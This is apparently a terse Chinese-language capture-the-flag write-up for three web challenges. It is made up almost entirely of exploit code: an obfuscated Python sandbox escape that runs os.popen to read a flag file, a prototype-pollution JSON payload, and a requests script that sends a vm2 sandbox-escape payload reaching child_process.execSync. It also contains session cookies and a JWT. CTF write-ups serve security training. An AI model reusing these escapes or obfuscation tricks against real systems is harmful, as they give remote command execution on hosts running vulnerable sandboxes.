# Web

## CookieBack

```nginx
http://116.236.144.37:29204/cookie?data=123
# 拿到cookie
connect.sid=s%3A6jQvn5ueJbwlvfirgCZAsQ8WenN4He8u.1hEPvT0YNtyut4jYIJ9X0OjHikOq1s7QCPqe8Dpz1P8
```

```nginx
# 在传入data,falg显示5秒
http://116.236.144.37:29204/cookie?data=connect.sid=s%3A6jQvn5ueJbwlvfirgCZAsQ8WenN4He8u.1hEPvT0YNtyut4jYIJ9X0OjHikOq1s7QCPqe8Dpz1P8
```



##ezpython



```py
# 构造出了__import__('os').popen('cat /dev/flag').read()
print(ᵉval(vars(ᵉval(list(dict(_a_aiamapaoarata_a_=()))[len([])][::len(list(dict(aa=()))[len([])])])(list(dict(b_i_n_a_s_c_i_i_=()))[len([])][::len(list(dict(aa=()))[len([])])]))[list(dict(a_𝟤_b𝟣_𝟣b_a_s_e_𝟨_𝟦=()))[len([])][::len(list(dict(aa=()))[len([])])]](list(dict(X𝟣𝟫pbXBvcnRfXygnb𝟥MnKS𝟧wb𝟥BlbignY𝟤F𝟢IGZsYWcnKS𝟧yZWFkKCkg=()))[len([])])))
```

## easy_node

```
/vm2_tester 传入参数，然后复制好cookie
{
    "name": "123",
    "properties": {
     "length":1,
     "0":{
      "0":"vm2_tester",
      "length":1
     }
 }
}
```

```
import requests

url = 'http://116.236.144.37:20950/vm2'
data = {"code":"eval(\"const stack=()=>{new Error().stack;stack();};err = {};const handler = {getPr\"+\"ototypeOf(target) {(stack)();}};const proxiedErr = new Proxy(err, handler);try {throw proxiedErr;} catch ({constructor: c}) {c.constructor('return process')().mainModule.require('child_process').execSync('cat /f*');}\")"}
headers = {
    "Content-Type": "application/json",
    "Cookie": "rt_web_csrf_token=ct6wK4YrkN84eUiKXteHENamjzQh4qwgw5Mnwxjqp5vvbqQElt1YHKSpteC8dsS4; rt_web__jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZjQyYjRhZTQ1N2FhMzEyNjE5ZTZhOWU2MTI1NzI4MjIiLCJ1c2VybmFtZSI6IjE1MzEwODE1OTgwIiwiZXhwIjoxNjg0NjQ2NjAxLCJlbWFpbCI6IjI0MjU0MDQyNDBAcXEuY29tIn0.n4edxXhQMx3waR-aWiL2Di8WhkW9mhVCNTgOg6gvCk4; connect.sid=s%3AG91Cu4d9xlSxxzcWmJ_pNtU-Fj4L3vC2.XRedsAeY47vnO1jpkjZyOBL2fQZjkWbvvIwM9%2Fkc1Rg"
}
response = requests.post(url, json=data, headers=headers)
print(response.text)
```

